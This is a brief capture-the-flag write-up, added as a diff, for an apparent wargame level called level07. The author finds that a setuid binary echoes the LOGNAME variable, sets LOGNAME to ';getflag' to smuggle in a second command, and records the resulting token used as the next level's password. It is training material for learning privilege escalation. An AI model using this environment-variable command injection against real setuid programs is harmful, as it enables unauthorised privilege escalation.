@@ -1,0 +1,33 @@
+$ ls -l
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+$ ./level07
+level07
+
+Let's check if the program print its name
+
+$ cp level07 /tmp/test && /tmp/test
+level07
+
+No its not printing it's name.
+level07 is also our username lets check this
+
+$export LOGNAME=ok && ./level07
+ok
+
+so the program print our LOGNAME, lets try to inject some char
+
+$ export LOGNAME=\"\;\& && echo $LOGNAME
+";&
+
+$./level07
+ sh: 1: Syntax error: Unterminated quoted string
+
+perfect, we can inject cmd like this
+
+$ export LOGNAME=\;getflag && ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+su level08
+password : fiumuikeil55xe9cu4dood66h
+
